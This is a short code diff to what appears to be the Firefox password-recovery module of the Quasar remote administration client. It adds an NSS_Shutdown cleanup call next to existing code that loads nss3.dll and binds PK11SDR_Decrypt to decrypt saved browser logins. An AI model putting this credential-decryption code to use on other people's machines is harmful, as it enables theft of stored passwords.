@@ -15,9 +15,14 @@ namespace Quasar.Client.Recovery.Browsers
         public delegate long NssInit(string configDirectory);
 
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        public delegate long NssShutdown();
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         public delegate int Pk11sdrDecrypt(ref TSECItem data, ref TSECItem result, int cx);
 
         private NssInit NSS_Init;
+
+        private NssShutdown NSS_Shutdown;
 
         private Pk11sdrDecrypt PK11SDR_Decrypt;
 
@@ -30,9 +35,11 @@ namespace Quasar.Client.Recovery.Browsers
             Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
             NSS3 = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
             IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
+            IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
             IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");
             NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
             PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
+            NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
             return NSS_Init(configDirectory);
         }
 
@@ -100,6 +107,7 @@ namespace Quasar.Client.Recovery.Browsers
         {
             if (disposing)
             {
+                NSS_Shutdown();
                 NativeMethods.FreeLibrary(NSS3);
                 NativeMethods.FreeLibrary(Mozglue);
             }
